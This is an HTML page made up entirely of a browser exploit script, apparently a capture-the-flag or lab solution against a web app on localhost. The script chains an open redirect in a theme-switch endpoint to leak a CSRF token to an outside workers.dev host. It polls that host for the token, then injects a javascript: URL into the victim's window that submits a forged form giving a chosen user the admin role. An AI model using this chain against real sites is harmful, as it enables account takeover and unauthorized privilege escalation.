<!doctype html>
<html>
<body>
<script>
const STREAM_BASE = "https://flat-unit-aed6.xxterenerertxx.workers.dev";
const TARGET_ORIGIN = "http://localhost:5000";
const TARGET_USER_ID = "11457e29-9694-446e-a1f2-d1061dff4eb8";
const id = "run200";

const host = new URL(STREAM_BASE).host;
const innerTheme =
  `../../switch_theme?theme=light&redirect_path=//${host}/stream/${id}`;

const victimUrl =
  `${TARGET_ORIGIN}/switch_theme?theme=${encodeURIComponent(innerTheme)}&redirect_path=/edit_user`;

let victimWin = null;
let finished = false;

function openVictim() {
  victimWin = window.open(victimUrl, "victim");
}

async function getState() {
  const r = await fetch(`${STREAM_BASE}/state/${id}?r=${Math.random()}`, {
    cache: "no-store"
  });
  return await r.json();
}

function sendFinal(token) {
  if (finished) return;
  finished = true;

  const js = `javascript:(() => {
    const f = document.createElement('form');
    f.method = 'POST';
    f.action = '/edit_user';
    f.innerHTML = \`
      <input name="user_id" value="${TARGET_USER_ID}">
      <input name="username" value="">
      <input name="password" value="">
      <input name="role" value="admin">
      <input name="csrf_token" value="${token}">
    \`;
    document.body.appendChild(f);
    f.submit();
  })()`;

  victimWin.location = js;
}

async function poll() {
  const st = await getState();
  console.log(st);

  if (st.done && st.token) {
    sendFinal(st.token);
    return;
  }
  setTimeout(poll, 80);
}

openVictim();
poll();
</script>
</body>
</html>
